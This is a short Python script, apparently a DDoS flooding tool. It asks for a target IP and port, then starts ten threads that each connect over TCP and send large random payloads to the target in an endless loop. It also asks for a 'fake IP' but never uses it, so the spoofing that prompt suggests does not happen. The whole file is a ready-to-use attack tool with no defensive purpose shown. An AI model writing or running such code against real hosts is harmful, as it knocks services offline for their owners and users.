import socket
import random
import threading

fake_ip = str(input("Fake IP = "))
target_ip = str(input("Target IP = "))
target_port = int(input("Target Port = "))

def ddos():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        print("[?] DDoS Created for: ( IP:", target_ip, "|", "Port:", target_port, ")")
        payload = random._urandom(random.randint(32768, 65536)) * random.randint(500, 1000)
        while True:
            sock.sendto(payload, (target_ip, target_port))
            print("[*] DDoS Successful for: ( IP:", target_ip, "Port:", "|", target_port, ")")
    except KeyboardInterrupt:
        print("[!] DDoS Exit")
    except Exception as e:
        print("[!] DDoS an error occurred:", str(e))

for i in range(10):
    thread = threading.Thread(target=ddos)
    thread.start()